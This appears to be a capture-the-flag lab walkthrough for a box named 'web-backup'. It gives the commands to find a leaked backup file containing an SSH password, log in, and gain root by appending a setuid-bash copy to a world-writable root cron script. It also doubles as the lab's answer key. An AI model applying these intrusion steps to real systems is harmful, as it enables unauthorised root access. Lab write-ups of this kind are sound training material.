# web-backup - walkthrough (spoilers)

The intended path. The SSH password and flags are randomised per build, so the
only way in is to find the leaked backup, not to guess.

## 1. Recon
The box serves a static site on port 80.

```
nmap -sV <ip>
curl http://<ip>/
```

## 2. Content discovery -> leaked backup
Nothing is linked from the page. Enumerate for common leftovers, including
editor and backup extensions:

```
feroxbuster -u http://<ip>/ -x bak,old,txt   # or gobuster with -x bak
```

This finds `deploy.sh.bak`. nginx serves it as plaintext (it is not executed),
and it contains the deploy user's SSH password:

```
curl http://<ip>/deploy.sh.bak
# ... DEPLOY_USER=dev / DEPLOY_PASS=<random, unique to this build> ...
```

## 3. Foothold
```
ssh dev@<ip>             # password from the leaked backup
cat ~/user.txt
```

## 4. Privilege escalation (world-writable root cron)
A root cron job runs a maintenance script every minute, and the script is
world-writable:

```
cat /etc/cron.d/maintenance          # * * * * * root /opt/maint/collect.sh
ls -l /opt/maint/collect.sh          # -rwxrwxrwx, owned by root
```

Rewrite it to drop a root shell, wait for the next minute, then use it:

```
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/maint/collect.sh
sleep 60
/tmp/rootbash -p
cat /root/root.txt
```

Both flags match `vms/web-backup/flags.txt`, which the build engine writes for
the operator.
